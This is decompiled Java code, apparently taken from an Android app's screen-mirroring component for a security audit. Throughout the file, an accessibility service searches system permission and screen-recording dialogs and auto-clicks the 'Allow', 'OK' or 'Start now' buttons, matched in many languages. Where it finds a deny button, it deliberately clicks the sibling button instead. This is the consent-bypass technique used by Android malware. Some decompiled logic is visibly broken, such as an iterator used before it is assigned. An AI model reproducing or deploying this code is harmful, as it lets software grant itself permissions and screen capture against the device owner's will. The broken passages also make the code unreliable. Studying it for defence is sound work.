// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package f2;

import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class x {

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static final List f1351e = Arrays.asList("android:id/button1", "com.android.systemui:id/button1", "com.android.settings:id/button1", "com.android.permissioncontroller:id/permission_allow_button", "com.google.android.permissioncontroller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_button");

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final List f1352f = Arrays.asList("android:id/switch_widget", "android:id/checkbox", "android:id/switch_bar", "android:id/switchWidget", "com.android.settings:id/switch_widget", "com.android.settings:id/switch_bar");

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public static final String[] f1353g = {"确定", "知道了", "立即开始", "开始录制", "同意", "允许", "OK", "ok", "Ok", "Start now", "Start", "Got it", "Accept", "Allow", "ALLOW", "Yes", "Agree", "ठीक है", "शुरू करें", "अनुमति दें", "हां", "स्वीकार करें", "सहमत", "ঠিক আছে", "অনুমতি দিন", "শুরু করুন", "হ্যাঁ", "সম্মত", "Bắt đầu", "Cho phép", "Đồng ý", "Bắt đầu ngay", "Có", "Oke", "Mulai", "Izinkan", "Setuju", "Mulai sekarang", "Ya", "Mula", "Benarkan", "ตกลง", "เริ่ม", "อนุญาต", "เริ่มต้น", "ยอมรับ", "ใช่", "เริ่มเลย", "موافق", "بدء", "السماح", "نعم", "قبول", "ابدأ", "ابدأ الآن", "Aceptar", "Iniciar", "Permitir", "Sí", "De acuerdo", "Empezar", "Aceitar", "Autorizar", "Sim", "Concordo", "Começar", "D'accord", "Démarrer", "Accepter", "Autoriser", "Oui", "Commencer", "ОК", "Начать", "Разрешить", "Да", "Принять", "Согласен", "今すぐ開始", "許可", "許可する", "開始", "はい", "同意する", "開始する", "확인", "시작", "허용", "시작하기", "동의", "승인", "네", "예", "Tamam", "Başla", "İzin ver", "Evet", "Kabul et", "Başlat", "Einverstanden", "Starten", "Zulassen", "Ja", "Akzeptieren", "Erlauben", "Accetta", "Avvia", "Consenti", "Sì", "Inizia", "Simulan", "Payagan", "Sang-ayon", "Oo", "အိုကေ", "စတင်ပါ", "ခွင့်ပြုပါ", "သဘောတူပါသည်", "យល់ព្រម", "ចាប់ផ្តើម", "អនុញ្ញាត", "បាទ/ចាស"};

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static final String[] f1354h = {"拒绝", "不允许", "禁止", "取消", "不同意", "Deny", "Don't allow", "Dont allow", "Reject", "Cancel", "Disagree", "No thanks", "Not now", "अस्वीकार", "नहीं", "रद्द", "অনুমতি দেবেন না", "বাতিল", "Từ chối", "Không", "Hủy", "Tolak", "Jangan izinkan", "Batal", "Tidak", "ปฏิเสธ", "ไม่อนุญาต", "ยกเลิก", "ไม่", "رفض", "عدم السماح", "إلغاء", "لا", "Denegar", "No permitir", "Cancelar", "No", "Negar", "Não permitir", "Não", "Refuser", "Ne pas autoriser", "Annuler", "Non", "Отклонить", "Не разрешать", "Отмена", "Нет", "拒否", "許可しない", "許可しません", "キャンセル", "いいえ", "거부", "허용 안함", "허용하지 않음", "취소", "아니요", "Reddet", "İzin verme", "İptal", "Hayır", "Ablehnen", "Nicht zulassen", "Abbrechen", "Nein", "Nega", "Non consentire", "Annulla", "Tanggihan", "Huwag payagan", "Kanselahin", "Hindi", "ငြင်းပယ်ပါ", "မခွင့်ပြု", "ပယ်ဖျက်", "បដិសេធ", "មិនអនុញ្ញាត", "បោះបង់"};

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static final String[] f1355i = {"颜色反转", "Color inversion", "色彩反转", "色彩校正", "Color correction", "TalkBack", "Voice Assistant", "语音助理", "放大", "Magnification", "放大手势", "高对比度", "High contrast", "字幕", "Captions", "Live Caption", "开关控制", "Switch Access", "密码语音播报", "Speak passwords", "触摸和按住延迟", "Touch & hold delay", "无障碍功能菜单", "Accessibility Menu", "实时转写", "Live Transcribe"};

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final d0.d f1356a = new d0.d();

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public long f1357b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final ScreenMirrorService f1358c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final x1.r f1359d;

    public x(ScreenMirrorService screenMirrorService, x1.r rVar) {
        this.f1358c = screenMirrorService;
        this.f1359d = rVar;
    }

    public static void e(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) throws Throwable {
        if (accessibilityNodeInfo == null) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        String strTrim = text == null ? null : text.toString().trim();
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isEnabled() && strTrim != null && !strTrim.isEmpty()) {
            arrayList.add(AccessibilityNodeInfo.obtain(accessibilityNodeInfo));
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            try {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
                try {
                    e(child, arrayList);
                    n(child);
                } catch (Throwable th) {
                    th = th;
                    accessibilityNodeInfo2 = child;
                    n(accessibilityNodeInfo2);
                    throw th;
                }
            } catch (Throwable th2) {
                th = th2;
            }
        }
    }

    public static boolean f(String str, String[] strArr) {
        if (str != null && !str.isEmpty() && strArr != null) {
            String lowerCase = str.trim().toLowerCase(Locale.ROOT);
            if (lowerCase.isEmpty()) {
                return false;
            }
            for (String str2 : strArr) {
                if (str2 != null && !str2.isEmpty()) {
                    String lowerCase2 = str2.trim().toLowerCase(Locale.ROOT);
                    if (lowerCase2.isEmpty()) {
                        continue;
                    } else if (lowerCase2.length() <= 3) {
                        if (lowerCase.equals(lowerCase2)) {
                            return true;
                        }
                        for (String str3 : lowerCase.split("[\\s|/·•]+")) {
                            if (str3.equals(lowerCase2)) {
                                return true;
                            }
                        }
                    } else if (lowerCase.contains(lowerCase2)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static AccessibilityNodeInfo h(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        if (accessibilityNodeInfo == null) {
            return null;
        }
        if (accessibilityNodeInfo.isCheckable()) {
            return AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            try {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
                try {
                    AccessibilityNodeInfo accessibilityNodeInfoH = h(child);
                    if (accessibilityNodeInfoH != null) {
                        n(child);
                        return accessibilityNodeInfoH;
                    }
                    n(child);
                } catch (Throwable th) {
                    th = th;
                    accessibilityNodeInfo2 = child;
                    n(accessibilityNodeInfo2);
                    throw th;
                }
            } catch (Throwable th2) {
                th = th2;
            }
        }
        return null;
    }

    public static AccessibilityNodeInfo i(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr, String[] strArr2) throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        if (accessibilityNodeInfo == null) {
            return null;
        }
        String strL = l(accessibilityNodeInfo);
        if (!strL.isEmpty() && f(strL, strArr) && !f(strL, strArr2) && accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isEnabled()) {
            return AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            try {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
                try {
                    AccessibilityNodeInfo accessibilityNodeInfoI = i(child, strArr, strArr2);
                    if (accessibilityNodeInfoI != null) {
                        n(child);
                        return accessibilityNodeInfoI;
                    }
                    n(child);
                } catch (Throwable th) {
                    th = th;
                    accessibilityNodeInfo2 = child;
                    n(accessibilityNodeInfo2);
                    throw th;
                }
            } catch (Throwable th2) {
                th = th2;
            }
        }
        return null;
    }

    public static AccessibilityNodeInfo j(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        if (accessibilityNodeInfo != null) {
            String strL = l(accessibilityNodeInfo);
            if (strL != null && !strL.isEmpty()) {
                String lowerCase = strL.toLowerCase(Locale.ROOT);
                String[] strArr = i0.f1212k;
                for (int i3 = 0; i3 < 19; i3++) {
                    if (lowerCase.contains(strArr[i3].toLowerCase(Locale.ROOT))) {
                        return AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i4 = 0; i4 < childCount; i4++) {
                try {
                    AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i4);
                    try {
                        AccessibilityNodeInfo accessibilityNodeInfoJ = j(child);
                        if (accessibilityNodeInfoJ != null) {
                            n(child);
                            return accessibilityNodeInfoJ;
                        }
                        n(child);
                    } catch (Throwable th) {
                        th = th;
                        accessibilityNodeInfo2 = child;
                        n(accessibilityNodeInfo2);
                        throw th;
                    }
                } catch (Throwable th2) {
                    th = th2;
                }
            }
        }
        return null;
    }

    public static boolean k(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        AccessibilityNodeInfo child;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isEnabled() && text != null && text.length() > 0) {
            return true;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            try {
                child = accessibilityNodeInfo.getChild(i3);
                try {
                    if (k(child)) {
                        n(child);
                        return true;
                    }
                    n(child);
                } catch (Throwable th) {
                    th = th;
                    n(child);
                    throw th;
                }
            } catch (Throwable th2) {
                th = th2;
                child = null;
            }
        }
        return false;
    }

    public static String l(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder();
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null) {
            sb.append(text);
            sb.append(' ');
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null) {
            sb.append(contentDescription);
        }
        return sb.toString().trim();
    }

    public static String m(AccessibilityNodeInfo accessibilityNodeInfo) {
        return accessibilityNodeInfo.getPackageName() == null ? "" : accessibilityNodeInfo.getPackageName().toString();
    }

    public static void n(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        try {
            accessibilityNodeInfo.recycle();
        } catch (Throwable unused) {
        }
    }

    public final boolean a(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        String[] strArr;
        ArrayList arrayList = new ArrayList();
        e(accessibilityNodeInfo, arrayList);
        int i3 = 0;
        if (!arrayList.isEmpty()) {
            try {
                int size = arrayList.size();
                AccessibilityNodeInfo accessibilityNodeInfo2 = null;
                int i4 = 0;
                AccessibilityNodeInfo accessibilityNodeInfo3 = null;
                while (true) {
                    strArr = f1354h;
                    if (i4 >= size) {
                        break;
                    }
                    Object obj = arrayList.get(i4);
                    i4++;
                    AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj;
                    String strL = l(accessibilityNodeInfo4);
                    if (!strL.isEmpty()) {
                        if (f(strL, strArr)) {
                            if (accessibilityNodeInfo3 == null) {
                                accessibilityNodeInfo3 = accessibilityNodeInfo4;
                            }
                        } else if (f(strL, f1353g)) {
                            accessibilityNodeInfo2 = accessibilityNodeInfo4;
                            break;
                        }
                    }
                }
                if (accessibilityNodeInfo2 == null && accessibilityNodeInfo3 != null) {
                    int size2 = arrayList.size();
                    int i5 = 0;
                    while (i5 < size2) {
                        Object obj2 = arrayList.get(i5);
                        i5++;
                        AccessibilityNodeInfo accessibilityNodeInfo5 = (AccessibilityNodeInfo) obj2;
                        if (accessibilityNodeInfo5 != accessibilityNodeInfo3) {
                            String strL2 = l(accessibilityNodeInfo5);
                            if (!strL2.isEmpty() && !f(strL2, strArr)) {
                                Log.i("CalisePopSysDialog", "Reverse-click: found deny '" + l(accessibilityNodeInfo3) + "', clicking sibling '" + strL2 + "'");
                                accessibilityNodeInfo2 = accessibilityNodeInfo5;
                                break;
                            }
                        }
                    }
                }
                if (accessibilityNodeInfo2 == null) {
                    int size3 = arrayList.size();
                    int i6 = 0;
                    while (i6 < size3) {
                        Object obj3 = arrayList.get(i6);
                        i6++;
                        n((AccessibilityNodeInfo) obj3);
                    }
                } else {
                    if (d(accessibilityNodeInfo2)) {
                        Log.i("CalisePopSysDialog", "Auto-click system dialog by text: '" + l(accessibilityNodeInfo2) + "'");
                        int size4 = arrayList.size();
                        while (i3 < size4) {
                            Object obj4 = arrayList.get(i3);
                            i3++;
                            n((AccessibilityNodeInfo) obj4);
                        }
                        return true;
                    }
                    int size5 = arrayList.size();
                    int i7 = 0;
                    while (i7 < size5) {
                        Object obj5 = arrayList.get(i7);
                        i7++;
                        n((AccessibilityNodeInfo) obj5);
                    }
                }
            } catch (Throwable th) {
                int size6 = arrayList.size();
                while (i3 < size6) {
                    Object obj6 = arrayList.get(i3);
                    i3++;
                    n((AccessibilityNodeInfo) obj6);
                }
                throw th;
            }
        }
        return false;
    }

    public final boolean b(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfoI = i(accessibilityNodeInfo, f1353g, f1354h);
        if (accessibilityNodeInfoI == null) {
            return false;
        }
        try {
            if (!d(accessibilityNodeInfoI)) {
                return false;
            }
            Log.i("CalisePopSysDialog", "Auto-click system dialog by text: '" + l(accessibilityNodeInfoI) + "'");
            return true;
        } finally {
            n(accessibilityNodeInfoI);
        }
    }

    public final boolean c(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfo2;
        Iterator it = f1351e.iterator();
        while (true) {
            accessibilityNodeInfo2 = null;
            if (!it.hasNext()) {
                break;
            }
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((String) it.next());
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    AccessibilityNodeInfo accessibilityNodeInfo3 = null;
                    for (AccessibilityNodeInfo accessibilityNodeInfo4 : listFindAccessibilityNodeInfosByViewId) {
                        if (accessibilityNodeInfo3 == null && accessibilityNodeInfo4.isEnabled()) {
                            if (!accessibilityNodeInfo4.isClickable()) {
                                try {
                                    AccessibilityNodeInfo parent = accessibilityNodeInfo4.getParent();
                                    int i3 = 0;
                                    while (true) {
                                        if (parent == null || i3 >= 5) {
                                            n(parent);
                                        } else {
                                            try {
                                                if (parent.isClickable() && parent.isEnabled()) {
                                                    n(parent);
                                                } else {
                                                    AccessibilityNodeInfo parent2 = parent.getParent();
                                                    n(parent);
                                                    i3++;
                                                    parent = parent2;
                                                }
                                            } catch (Throwable th) {
                                                th = th;
                                                accessibilityNodeInfo2 = parent;
                                                n(accessibilityNodeInfo2);
                                                throw th;
                                            }
                                        }
                                    }
                                } catch (Throwable th2) {
                                    th = th2;
                                }
                            }
                            accessibilityNodeInfo3 = accessibilityNodeInfo4;
                        }
                        n(accessibilityNodeInfo4);
                    }
                    if (accessibilityNodeInfo3 != null) {
                        accessibilityNodeInfo2 = accessibilityNodeInfo3;
                        break;
                    }
                }
            } catch (Exception unused) {
            }
        }
        if (accessibilityNodeInfo2 == null) {
            return false;
        }
        try {
            if (!d(accessibilityNodeInfo2)) {
                return false;
            }
            Log.i("CalisePopSysDialog", "Auto-click system dialog by positive resource-id: " + accessibilityNodeInfo2.getViewIdResourceName());
            return true;
        } finally {
            n(accessibilityNodeInfo2);
        }
    }

    public final boolean d(AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        AccessibilityNodeInfo parent;
        x1.r rVar = this.f1359d;
        if (rVar != null) {
            return rVar.a(accessibilityNodeInfo);
        }
        boolean zIsClickable = accessibilityNodeInfo.isClickable();
        d0.d dVar = this.f1356a;
        if (zIsClickable && accessibilityNodeInfo.isEnabled()) {
            return dVar.e(16, accessibilityNodeInfo);
        }
        try {
            parent = accessibilityNodeInfo.getParent();
            int i3 = 0;
            while (parent != null && i3 < 5) {
                try {
                    if (parent.isClickable() && parent.isEnabled()) {
                        boolean zE = dVar.e(16, parent);
                        n(parent);
                        return zE;
                    }
                    AccessibilityNodeInfo parent2 = parent.getParent();
                    n(parent);
                    i3++;
                    parent = parent2;
                } catch (Throwable th) {
                    th = th;
                    n(parent);
                    throw th;
                }
            }
            n(parent);
            return false;
        } catch (Throwable th2) {
            th = th2;
            parent = null;
        }
    }

    public final AccessibilityNodeInfo g(String str) {
        Iterator<AccessibilityWindowInfo> it;
        List<AccessibilityWindowInfo> list = Collections.EMPTY_LIST;
        try {
            List<AccessibilityWindowInfo> windows = this.f1358c.getWindows();
            if (windows != null) {
                list = windows;
            }
            while (true) {
                AccessibilityNodeInfo root = null;
                if (!it.hasNext()) {
                    return null;
                }
                AccessibilityWindowInfo next = it.next();
                if (next != null && next.getType() != 4) {
                    try {
                        root = next.getRoot();
                    } catch (Exception unused) {
                    }
                    if (root == null) {
                        continue;
                    } else {
                        String strM = m(root);
                        if (strM.equals(str)) {
                            n(root);
                        } else {
                            String[] strArr = i0.f1210i;
                            int i3 = 0;
                            while (true) {
                                if (i3 >= 6) {
                                    if (i0.v(strM)) {
                                    }
                                    n(root);
                                } else if (!strArr[i3].equals(strM)) {
                                    i3++;
                                }
                                if (k(root)) {
                                    StringBuilder sbK = a0.a.k("found system dialog window with buttons: pkg=", strM, " type=");
                                    sbK.append(next.getType());
                                    Log.i("CalisePopSysDialog", sbK.toString());
                                    return root;
                                }
                                n(root);
                            }
                        }
                    }
                }
            }
        } catch (Exception unused2) {
        }
        it = list.iterator();
    }
}
